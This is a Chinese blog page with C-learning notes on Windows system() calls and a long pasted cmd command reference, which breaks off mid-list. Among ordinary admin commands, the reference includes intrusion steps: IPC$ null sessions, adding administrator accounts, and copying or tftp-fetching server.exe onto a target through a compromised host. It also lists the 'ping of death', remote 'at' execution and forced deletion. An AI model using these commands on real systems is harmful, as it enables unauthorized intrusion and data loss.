@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="MFCsystemMFC 一个快速构建窗口程序框架  system系统命令 使用system命令都必须有以下省略1#include&lt;stdlib.h&gt; 以下代码均为windows命令行 带路径的“应该处理为\” \需要处理为\ 64bit系统中（x86）前应该有一个空格，括号前要有空格 关闭进程12messageBoxA(0,&quot;禁止聊天&quot;,&quot;QQ提示&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CLearning2">
+<meta property="og:url" content="http://yoursite.com/2019/08/30/C/CLearning2/index.html">
+<meta property="og:site_name" content="lmblog(hexo)">
+<meta property="og:description" content="MFCsystemMFC 一个快速构建窗口程序框架  system系统命令 使用system命令都必须有以下省略1#include&lt;stdlib.h&gt; 以下代码均为windows命令行 带路径的“应该处理为\” \需要处理为\ 64bit系统中（x86）前应该有一个空格，括号前要有空格 关闭进程12messageBoxA(0,&quot;禁止聊天&quot;,&quot;QQ提示&amp;qu">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-08-30T05:40:52.000Z">
+<meta property="article:modified_time" content="2019-08-30T07:54:39.000Z">
+<meta property="article:author" content="lmfalcon">
+<meta property="article:tag" content="C, cmd命令大全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://yoursite.com/2019/08/30/C/CLearning2/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yoursite.com/2019/08/30/C/CLearning2/","path":"2019/08/30/C/CLearning2/","title":"CLearning2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CLearning2 | lmblog(hexo)</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lmblog(hexo)</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MFCsystem"><span class="nav-number">1.</span> <span class="nav-text">MFCsystem</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MFC"><span class="nav-number">1.1.</span> <span class="nav-text">MFC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#system%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">system系统命令</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lmfalcon</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lmfalcon" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lmfalcon" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:893702944@qq.com" title="E-Mail → mailto:893702944@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/30/C/CLearning2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lmfalcon">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lmblog(hexo)">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CLearning2 | lmblog(hexo)">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CLearning2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2019-08-30 13:40:52 / 修改时间：15:54:39" itemprop="dateCreated datePublished" datetime="2019-08-30T13:40:52+08:00">2019-08-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/C/" itemprop="url" rel="index"><span itemprop="name">C</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="MFCsystem"><a href="#MFCsystem" class="headerlink" title="MFCsystem"></a>MFCsystem</h1><h2 id="MFC"><a href="#MFC" class="headerlink" title="MFC"></a>MFC</h2><ul>
+<li>一个快速构建窗口程序框架</li>
+</ul>
+<h2 id="system系统命令"><a href="#system系统命令" class="headerlink" title="system系统命令"></a>system系统命令</h2><ul>
+<li>使用system命令都必须有以下省略<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br></pre></td></tr></table></figure></li>
+<li>以下代码均为windows命令行</li>
+<li>带路径的“应该处理为\”</li>
+<li>\需要处理为\</li>
+<li>64bit系统中（x86）前应该有一个空格，括号前要有空格</li>
+<li>关闭进程<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">messageBoxA(0,&quot;禁止聊天&quot;,&quot;QQ提示&quot;,0);</span><br><span class="line">system(&quot;taskkill /f /i QQ.exe&quot;);	//	/f表示强制关闭 /im 进程名</span><br></pre></td></tr></table></figure></li>
+<li>打开网站<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;/&quot;浏览器路径(注意用双引号，注意转义)&quot; url（想关闭的网站）&quot;） </span><br></pre></td></tr></table></figure></li>
+<li>关闭网站类似关闭进程</li>
+<li>命令提示符指令并行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;tasklist &amp; pause&quot;);</span><br></pre></td></tr></table></figure></li>
+<li>导入命令行到文本（类似cat和重定向）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;tasklist &gt; C:\\X.txt &quot;)</span><br></pre></td></tr></table></figure></li>
+<li>读取程序文本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(type &quot;\&quot;路径&quot; &amp; pause&quot;)</span><br></pre></td></tr></table></figure></li>
+<li>cmd窗口变色改变标题<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;color 4f &amp; title 标题 &amp; echo 内容 &amp; pause&quot;);</span><br></pre></td></tr></table></figure></li>
+<li>打开音乐播放器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;音乐路径&quot;);</span><br></pre></td></tr></table></figure></li>
+<li>删除文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(del 文件);</span><br></pre></td></tr></table></figure></li>
+<li>管理应用程序<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;appwiz.cpl&quot;);</span><br></pre></td></tr></table></figure></li>
+<li>字符映射表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;charmap&quot;);</span><br></pre></td></tr></table></figure></li>
+<li>屏幕分辨率	desk.cpl</li>
+<li>优化驱动器	dfrgui</li>
+<li>电话拨号程序	dialer</li>
+<li>磁盘管理	diskmgmt.msc</li>
+<li>具体百度查询，这里剩下只列举常用命令及用法</li>
+<li>DirectX信息检查 dxdiag	用于检查例如手柄的使用是否正常</li>
+<li>阻塞状态<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;calc&quot;);</span><br><span class="line">system(&quot;calc&quot;);</span><br><span class="line">system(&quot;calc&quot;);</span><br><span class="line">//以上状态阻塞</span><br><span class="line">//同步状态，等待这个程序关闭后执行下一步</span><br><span class="line">system(&quot;start calc / max &quot;);	//最大化计算器没办法最大化和最小化，这里只是演示，指令可能过时，需要自己查找新指令</span><br><span class="line">system(&quot;start calc  / min &quot;);	//最小化窗口</span><br><span class="line">system(&quot;start calc&quot;);</span><br><span class="line">//异步状态，同时执行三个程序</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<ul>
+<li>以下内容粘贴自百度，注释（使用#进行注释防止中英文频繁切换）视频中提到的用法</li>
+</ul>
+<ol>
+<li>calc———–启动计算器</li>
+<li>certmgr.msc—-证书管理实用程序</li>
+<li>charmap——–启动字符映射表</li>
+<li>chkdsk.exe—–Chkdsk磁盘检查</li>
+<li>ciadv.msc——索引服务程序</li>
+<li>cleanmgr——-垃圾整理</li>
+<li>cliconfg——-SQL SERVER 客户端网络实用程序</li>
+<li>Clipbrd——–剪贴板查看器</li>
+<li>cmd.exe——–CMD命令提示符</li>
+<li>compmgmt.msc—计算机管理</li>
+<li>conf———–启动netmeeting</li>
+<li>dcomcnfg——-打开系统组件服务</li>
+<li>ddeshare——-打开DDE共享设置</li>
+<li>devmgmt.msc— 设备管理器</li>
+<li>dfrg.msc——-磁盘碎片整理程序</li>
+<li>diskmgmt.msc—磁盘管理实用程序</li>
+<li>drwtsn32—— 系统医生</li>
+<li>dvdplay——–DVD播放器</li>
+<li>dxdiag———检查DirectX信息</li>
+<li>explorer——-打开资源管理器</li>
+<li>eudcedit——-造字程序		# 字体设计</li>
+<li>eventvwr——-事件查看器	# 查看系统和应用日志信息</li>
+<li>fsmgmt.msc—–共享文件夹管理器	# 共享文件信息，可能会对系统磁盘中造成破坏</li>
+<li>gpedit.msc—–组策略	# 控制不同用户组的权限，例如公司电脑U盘不能拷贝的问题</li>
+<li>iexpress——-木马捆绑工具，系统自带	# 捆绑程序，随exe文件的打开自动运行</li>
+<li>logoff———注销命令</li>
+<li>lusrmgr.msc—-本机用户和组</li>
+<li>notepad——–打开记事本</li>
+<li>magnify——–放大镜实用程序	# 老花辅助程序</li>
+<li>mem.exe——–显示内存使用情况</li>
+<li>mmc————打开控制台49.</li>
+<li>mobsync——–同步命令</li>
+<li>mplayer2——-简易widnows media player</li>
+<li>Msconfig.exe—系统配置实用程序</li>
+<li>mspaint——–画图板</li>
+<li>mstsc———-远程桌面连接		# 远程控制</li>
+<li>narrator——-屏幕“讲述人”		# 盲人电脑设置</li>
+<li>net start messenger—-开始信使服务</li>
+<li>netstat -an—-(TC)命令检查接口</li>
+<li>net stop messenger—–停止信使服务</li>
+<li>Nslookup——-IP地址侦测器 ，是一个监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具.<br>它在Windows NT&#x2F;2000&#x2F;XP中均可使用，但在 Windows 98 中却没有集成这一个工具。</li>
+<li>ntbackup——-系统备份和还原</li>
+<li>ntmsmgr.msc—-移动存储管理器</li>
+<li>ntmsoprq.msc—移动存储管理员操作请求</li>
+<li>odbcad32——-ODBC数据源管理器</li>
+<li>oobe&#x2F;msoobe &#x2F;a—-检查XP是否激活</li>
+<li>osk————打开屏幕键盘</li>
+<li>packager——-对象包装程序</li>
+<li>perfmon.msc—-计算机性能监测程序</li>
+<li>progman——–程序管理器</li>
+<li>regedit.exe—-注册表</li>
+<li>regedt32——-注册表编辑器</li>
+<li>regsvr32 &#x2F;u *.dll—-停止dll文件运行</li>
+<li>regsvr32 &#x2F;u zipfldr.dll——取消ZIP支持</li>
+<li>rononce -p—-15秒关机</li>
+<li>rsop.msc——-组策略结果集</li>
+<li>secpol.msc—–本地安全策略</li>
+<li>services.msc—本地服务设置</li>
+<li>sfc.exe——–系统文件检查器</li>
+<li>sfc &#x2F;scannow—–扫描错误并复原</li>
+<li>sfc &#x2F;scannow—windows文件保护</li>
+<li>shrpubw——–创建共享文件夹</li>
+<li>shutdown——-60秒倒计时关机命令</li>
+<li>sigverif——-文件签名验证程序</li>
+<li>sndrec32——-录音机</li>
+<li>Sndvol32——-音量控制程序</li>
+<li>syncapp——–创建一个公文包</li>
+<li>sysedit——–系统配置编辑器</li>
+<li>syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码	</li>
+<li>taskmgr——–任务管理器</li>
+<li>tourstart——xp简介（安装完成后出现的漫游xp程序）</li>
+<li>utilman——–辅助工具管理器</li>
+<li>wiaacmgr——-扫描仪和照相机向导</li>
+<li>winchat——–XP自带局域网聊天</li>
+<li>winmsd———系统信息</li>
+<li>winver———检查Windows版本</li>
+<li>write———-写字板</li>
+<li>wmimgmt.msc—-打开windows管理体系结构（WMI)</li>
+<li>wscript——–windows脚本宿主设置</li>
+<li>wupdmgr——–windows更新程序<br>操作详解<br>编辑<br>net use ipipc$ “ “ &#x2F;user:” “ 建立IPC空链接<br>net use ipipc$ “密码” &#x2F;user:”用户名” 建立IPC非空链接<br>net use h: ipc$ “密码” &#x2F;user:”用户名” 直接登陆后映射对方C：到本地为H:<br>net use h: ipc$ 登陆后映射对方C：到本地为H:<br>net use ipipc$ &#x2F;del 删除IPC链接<br>net use h: &#x2F;del 删除映射对方到本地的为H：的映射<br>net user 用户名　密码　&#x2F;add 建立用户<br>net user guest &#x2F;active:yes 激活guest用户<br>net user 查看有哪些用户<br>net user 帐户名 查看帐户的属性<br>net localgroup administrators 用户名 &#x2F;add 把“用户”添加到管理员中使其具有管理员权限<br>net start 查看开启了哪些服务<br>net start 服务名　开启服务；（如：net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net time 目标ip 查看对方时间<br>net time 目标ip &#x2F;set 设置本地计算机时间与“目标IP”主机的时间同步，加上参数&#x2F;yes可取消确认信息<br>net view 查看本地局域网内开启了哪些共享<br>net view ip 查看对方局域网内开启了哪些共享<br>net config 显示系统网络设置<br>net logoff 断开连接的共享<br>net pause 服务名 暂停某服务<br>net send ip “文本信息” 向对方发信息<br>net ver 局域网内正在使用的网络连接类型和信息<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ &#x2F;del 删除ipc$共享<br>net share c$ &#x2F;del 删除C：共享<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -a 查看开启了哪些端口，常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名<br>tracert -参数 ip(或计算机名） 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。	# 用于监视（黑客常用指令）<br>ping ip（或域名） 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。<br>ping -t -l 65500 ip 死亡之ping（发送大于64K的文件并一直ping就成了死亡之ping)<br>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98）查看本地ip地址，ipconfig可用参数“&#x2F;all”显示全部配置信息<br>tlist -t 以树行列表显示进程（为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内）<br>kill -F 进程名 加-F参数后强制结束某进程（为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内）<br>del -F 文件名 加-F参数后就可删除只读文件,&#x2F;AR、&#x2F;AH、&#x2F;AS、&#x2F;AA分别表示删除只读、隐藏、系统、存档文件，&#x2F;A-R、&#x2F;A-H、&#x2F;A-S、&#x2F;A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL&#x2F;AR *.<em>”表示删除当前目录下所有只读文件，“DEL&#x2F;A-S <em>.<em>”表示删除当前目录下除系统文件以外的所有文件<br>del &#x2F;S &#x2F;Q 目录 或用：rmdir &#x2F;s &#x2F;Q 目录 &#x2F;S删除目录及目录下的所有子目录和文件。同时使用参数&#x2F;Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件，用参数&#x2F;y将取消确认移动目录存在相同文件的提示就直接覆盖<br>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令<br>at id号 开启已注册的某个计划任务<br>at &#x2F;delete 停止所有计划任务，用参数&#x2F;yes则不需要确认就直接停止<br>at id号 &#x2F;delete 停止某个已注册的计划任务<br>at 查看所有的计划任务<br>at ip time 程序名（或一个命令） &#x2F;r 在某时间运行对方某程序并重新启动计算机<br>finger username @host 查看最近有哪些用户登陆<br>telnet ip 端口 远程登陆服务器，默认端口为23<br>open ip 连接到IP（属telnet登陆后的命令）<br>telnet 在本机上直接键入telnet 将进入本机的telnet<br>copy 路径文件名1　路径文件名2 &#x2F;y 复制文件1到指定的目录为文件2，用参数&#x2F;y就同时取消确认你要改写一份现存目录文件<br>copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下<br>copy 1st.jpg&#x2F;b+2st.txt&#x2F;a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：&#x2F;b指二进制文件，&#x2F;a指ASCLL格式文件<br>copy ipadmin$svv.exe c: 或：copyipadmin$</em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：<br>xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数&#x2F;Y将不提示覆盖相同文件<br>用参数&#x2F;e才可连目录下的子目录一起复制到目标地址下。<br>tftp -i 自己IP（用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送<br>tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机<br>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送（文本文件时）<br>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface			# 用于查看当前路由器的用户信息<br>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br>start 程序名或命令 &#x2F;max 或&#x2F;min 新开一个新窗口并最大化（最小化）运行某程序或命令<br>mem 查看cpu使用情况<br>attrib 文件名（目录名） 查看某文件（目录）的属性<br>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉（添加）某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性<br>dir 查看文件，参数：&#x2F;Q显示文件及目录属系统哪个用户，&#x2F;T:C显示文件创建时间，&#x2F;T:A显示文件上次被访问时间，&#x2F;T:W上次被修改时间<br>date &#x2F;t 、 time &#x2F;t 使用此参数即“DATE&#x2F;T”、“TIME&#x2F;T”将只显示当前日期和时间，而不必输入新日期和时间<br>set 指定环境变量名称&#x3D;要指派给变量的字符 设置环境变量<br>set 显示当前所有的环境变量<br>set p（或其它字符） 显示出当前以字符p（或其它字符）开头的所有环境变量<br>pause 暂停批处理程序，并显示出：请按任意键继续….<br>if 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）<br>call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call &#x2F;?）<br>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>echo 信息 在屏幕上显示出信息<br>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中<br>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello<br>find 文件名 查找某文件<br>title 标题名字 更改CMD窗口标题名字<br>color 颜色值 设置cmd控制台前景和背景颜色；0&#x3D;黑、1&#x3D;蓝、2&#x3D;绿、3&#x3D;浅绿、4&#x3D;红、5&#x3D;紫、6&#x3D;黄、7&#x3D;白、8&#x3D;灰、9&#x3D;淡蓝、A&#x3D;淡绿、B&#x3D;淡浅绿、C&#x3D;淡红、D&#x3D;淡紫、E&#x3D;淡黄、F&#x3D;亮白<br>prompt 名称 更改cmd.exe的显示的命令提示符（把C：、D：统一改为：EntSky )<br>ver 在DOS窗口下显示版本信息<br>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>format 盘符 &#x2F;FS：类型 格式化磁盘，类型：FAT、FAT32、NTFS,例：Format D: &#x2F;FS:NTFS<br>md　目录名 创建目录<br>replace 源文件　要替换文件的目录 替换文件<br>ren 原文件名　新文件名 重命名文件名<br>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>type 文件名 显示文本文件的内容	#不适用于大数据<br>more 文件名 逐屏显示输出文件	# 查看大数据文件，防止一次性读入过多数据，解决内存占用问题<br>doskey 要锁定的命令&#x3D;字符<br>doskey 要解锁命令&#x3D; 为DOS提供的锁定命令（编辑命令行，重新调用win2k命令，并创建宏）。如：锁定dir命令：doskey dir&#x3D;entsky （不能用doskey dir&#x3D;dir）；解锁：doskey dir&#x3D;<br>taskmgr 调出任务管理器<br>chkdsk &#x2F;F D: 检查磁盘D并显示状态报告；加参数&#x2F;f并修复磁盘上的错误<br>tlntadmn telnt服务admn，键入tlntadmn选择3，再选择8，就可以更改telnet服务默认端口23为其它任何端口<br>exit 退出cmd.exe程序或目前，用参数&#x2F;B则是退出当前批处理脚本而不是cmd.exe<br>path 路径可执行文件的文件名 为可执行文件设置一个路径。<br>cmd 启动一个win2K命令解释窗口。参数：&#x2F;eff、&#x2F;en 关闭、开启命令扩展；更我详细说明见cmd &#x2F;?<br>regedit &#x2F;s 注册表文件名 导入注册表；参数&#x2F;S指安静模式导入，无任何提示；<br>regedit &#x2F;e 注册表文件名 导出注册表<br>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：&#x2F;D 用户名：设定拒绝某用户访问；&#x2F;P 用户名：perm 替换指定用户的访问权限；&#x2F;G 用户名：perm 赋予指定用户访问权限；Perm 可以是： N 无，R 读取， W 写入， C 更改（写入），F 完全控制；例：cacls D: est.txt &#x2F;D pub 设定d: est.txt拒绝pub用户访问。<br>cacls 文件名 查看文件的访问用户权限列表<br>REM 文本内容 在批处理文件中添加注解<br>netsh 查看或更改本地网络配置情况<br>IIS服务命令<br>iisreset &#x2F;reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>iisreset &#x2F;start或stop 启动（停止）所有Internet服务<br>iisreset &#x2F;restart 停止然后重新启动所有Internet服务<br>iisreset &#x2F;status 显示所有Internet服务状态<br>iisreset &#x2F;enable或disable 在本地系统上启用（禁用）Internet服务的重新启动<br>iisreset &#x2F;rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>iisreset &#x2F;noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>iisreset &#x2F;timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定&#x2F;rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>FTP 命令：（后面有详细说明内容）<br>ftp的命令行格式为：<br>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>－d 使用调试方式。<br>－n 限制ftp的自动登录，即不使用.netrc文件。<br>－g 取消全局文件名。<br>help [命令] 或 ？[命令] 查看命令说明<br>bye 或 quit 终止主机FTP进程，并退出FTP管理方式.<br>pwd 列出当前远端主机目录<br>put 或 send 